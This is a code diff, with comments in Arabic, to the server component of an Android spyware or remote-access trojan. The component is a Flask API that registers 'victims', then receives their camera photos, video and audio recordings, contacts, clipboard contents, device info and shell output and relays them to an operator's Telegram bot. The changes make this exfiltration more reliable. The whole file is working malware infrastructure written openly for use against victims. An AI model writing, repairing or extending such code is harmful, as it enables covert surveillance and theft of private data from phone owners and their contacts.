@@ -1,6 +1,7 @@
 # api_victim.py
 # ============================================================
-# API للضحية (Victim APK) — register / poll / data
+# API للضحية (Victim APK) — v2
+# الصور والفيديو تُرسل مباشرة بدون تخزين
 # ============================================================
 
 import io
@@ -17,8 +18,14 @@ from imports_manager import (
 )
 
 
+# ★★ أنواع البيانات التي لا تُخزن في Redis (كبيرة)
+SKIP_STORE_TYPES = {
+    "camera_photo", "photo_single",
+    "video_record", "audio_record",
+}
+
+
 def init_victim_api(app, bot_instance=None):
-    """تسجيل كل API routes للضحية"""
     global bot
     if bot_instance:
         bot = bot_instance
@@ -76,8 +83,6 @@ def init_victim_api(app, bot_instance=None):
             return jsonify({"ok": True, "victim_id": victim_id}), 200
         except Exception as e:
             print(f"[-] register error: {e}")
-            import traceback
-            traceback.print_exc()
             return jsonify({"error": str(e)}), 500
 
     # ============================================================
@@ -130,8 +135,17 @@ def init_victim_api(app, bot_instance=None):
             victim_id = victim_info['victim_id']
             victim_name = victim_info.get('name', 'Unknown')
 
-            add_victim_data(victim_id, data)
-            update_victim_status(chat_id, victim_id, "active")
+            # ★★ لا تخزن الصور/الفيديو/الصوت (كبيرة الحجم)
+            if dtype not in SKIP_STORE_TYPES:
+                try:
+                    add_victim_data(victim_id, data)
+                except Exception as e:
+                    print(f"[-] store error: {e}")
+
+            try:
+                update_victim_status(chat_id, victim_id, "active")
+            except Exception:
+                pass
 
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
             print(f"[<<] {dtype} from {victim_name} ({victim_id[:8]})")
@@ -159,9 +173,16 @@ def init_victim_api(app, bot_instance=None):
                         )
                         print(f"[+] Photo sent to {cid}")
                     except Exception as e:
-                        bot.send_message(cid, f"❌ صورة فاشلة: {e}")
+                        print(f"[-] photo error: {e}")
+                        try:
+                            bot.send_message(cid, f"❌ صورة فاشلة: {e}")
+                        except Exception:
+                            pass
                 else:
-                    bot.send_message(cid, f"❌ صورة فاضية من {victim_name}")
+                    try:
+                        bot.send_message(cid, f"❌ صورة فاضية من {victim_name}")
+                    except Exception:
+                        pass
 
             # ============================================================
             # Video
@@ -183,7 +204,11 @@ def init_victim_api(app, bot_instance=None):
                         )
                         print(f"[+] Video sent to {cid}")
                     except Exception as e:
-                        bot.send_message(cid, f"❌ فيديو فاشل: {e}")
+                        print(f"[-] video error: {e}")
+                        try:
+                            bot.send_message(cid, f"❌ فيديو فاشل: {e}")
+                        except Exception:
+                            pass
 
             # ============================================================
             # Audio
@@ -205,7 +230,11 @@ def init_victim_api(app, bot_instance=None):
                         )
                         print(f"[+] Audio sent to {cid}")
                     except Exception as e:
-                        bot.send_message(cid, f"❌ صوت فاشل: {e}")
+                        print(f"[-] audio error: {e}")
+                        try:
+                            bot.send_message(cid, f"❌ صوت فاشل: {e}")
+                        except Exception:
+                            pass
 
             # ============================================================
             # Device Info
@@ -263,37 +292,40 @@ def init_victim_api(app, bot_instance=None):
                 bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
 
             # ============================================================
-            # Contacts (جديد: واحد واحد)
+            # Contacts — ★ دعم كامل للنسختين ★
             # ============================================================
             elif dtype == "contacts":
-                # يدعم النسختين: قائمة كاملة أو واحد واحد
                 contact = data.get("contact", None)
                 if contact:
-                    # واحد واحد
+                    # ★ نسخة فردية
                     index = data.get("index", 0)
                     total = data.get("total", 0)
                     name = contact.get("name", "?")
                     number = contact.get("number", "?")
+                    
                     # أرسل كل 25 مع بعض
-                    if index % 25 == 0 or index == total - 1:
+                    if index % 25 == 0:
                         try:
                             bot.send_message(
                                 cid,
-                                f"📇 **جهة اتصال** ({index + 1}/{total})\n"
+                                f"📇 **جهات الاتصال** ({index + 1}/{total})\n"
                                 f"• `{name}` — `{number}`",
                                 parse_mode="Markdown"
                             )
                         except Exception:
                             pass
                 else:
-                    # قائمة كاملة (قديم)
+                    # ★ نسخة كاملة (قديم)
                     contacts = data.get("contacts", [])
-                    lines = [f"👥 **جهات الاتصال ({len(contacts)})** — `{victim_name}`", "━" * 20]
-                    for c in contacts[:80]:
-                        lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
-                    msg = "\n".join(lines)
-                    for i in range(0, len(msg), 4000):
-                        bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
+                    if not contacts:
+                        bot.send_message(cid, f"📭 لا جهات اتصال من {victim_name}")
+                    else:
+                        lines = [f"👥 **جهات الاتصال ({len(contacts)})** — `{victim_name}`", "━" * 20]
+                        for c in contacts[:80]:
+                            lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
+                        msg = "\n".join(lines)
+                        for i in range(0, len(msg), 4000):
+                            bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")
 
             elif dtype == "contacts_done":
                 total = data.get("total", 0)
@@ -347,17 +379,7 @@ def init_victim_api(app, bot_instance=None):
                     bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")
 
             # ============================================================
-            # Photos List
-            # ============================================================
-            elif dtype == "photos":
-                photos = data.get("photos", [])
-                lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
-                for p in photos[:20]:
-                    lines.append(f"• `{p.get('path')}`")
-                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
-
-            # ============================================================
-            # Photo Single (واحدة واحدة)
+            # Photo Single
             # ============================================================
             elif dtype == "photo_single":
                 img_data = data.get("image", "")
@@ -374,7 +396,17 @@ def init_victim_api(app, bot_instance=None):
                             parse_mode="Markdown"
                         )
                     except Exception as e:
-                        print(f"[-] photo send error: {e}")
+                        print(f"[-] photo_single error: {e}")
+
+            # ============================================================
+            # Photos List
+            # ============================================================
+            elif dtype == "photos":
+                photos = data.get("photos", [])
+                lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
+                for p in photos[:20]:
+                    lines.append(f"• `{p.get('path')}`")
+                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
 
             # ============================================================
             # Shell
@@ -421,7 +453,10 @@ def init_victim_api(app, bot_instance=None):
             elif dtype == "heartbeat":
                 pass
 
-            update_victim_status(chat_id, victim_id, "active")
+            try:
+                update_victim_status(chat_id, victim_id, "active")
+            except Exception:
+                pass
 
             return jsonify({"status": "ok"}), 200
         except Exception as e:
